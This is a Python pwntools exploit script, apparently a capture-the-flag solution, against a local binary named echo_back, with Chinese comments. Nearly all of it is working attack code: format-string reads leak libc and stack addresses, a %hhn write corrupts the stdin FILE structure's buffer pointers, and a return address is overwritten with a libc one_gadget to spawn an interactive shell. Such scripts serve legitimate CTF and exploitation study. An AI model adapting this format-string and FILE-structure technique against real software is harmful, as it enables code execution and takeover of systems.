# encoding:utf-8
from pwn import *
p=process("./echo_back")
libc=ELF("/libc64.so")
context.log_level='debug'
context.terminal=["tmux","splitw","-h"]
def set_name(name):
    p.recv()
    p.sendline("1")
    p.sendline(name)

def echo_back(size,data):
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline(str(size))
    p.sendline(data)

def dbg(code=''):
    gdb.attach(p,code)

echo_back(7,"%19$p")
p.recvuntil(":")
libc_base=int(p.recvuntil("\n",drop=True),16)-0x20830
print hex(libc_base)
libc.address=libc_base
echo_back(7,"%21$p")
p.recvuntil(":")
stack_address=int(p.recvuntil("\n",drop=True),16)-0x110
print hex(stack_address)
set_name(p64(libc.symbols['_IO_2_1_stdin_']+0x38))
echo_back("7","%16$hhn") # 通过一个0字节将buf_base修改为write_base的地址
                         # 往后再次scanf的时候，就读入到此位置
#dbg("breakrva 0xbd5")
p.recv()
p.sendline("2")
p.recv()
p.send(p64(libc.address+0x3c4963)*3+p64(stack_address)+p64(stack_address+8))
p.sendline('\n')
#echo_back(p64(libc.address+0x3c4963)*3+p64(stack_address)+p64(stack_address+8),"1") # 这里往stdin结构体写入了数据，可以覆盖write_base,ptr,end与buf_base,end，这里将buf_base改为ret_addr
for i in range(0x27):
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline("") # 利用getchar进行read_ptr的增加直到end

#dbg("breakrva 0xbd5\np&_IO_2_1_stdin_\np*$1")
p.recv()
p.sendline("2")
p.send(p64(libc_base+0x45216))
p.sendline("\n")
p.interactive()
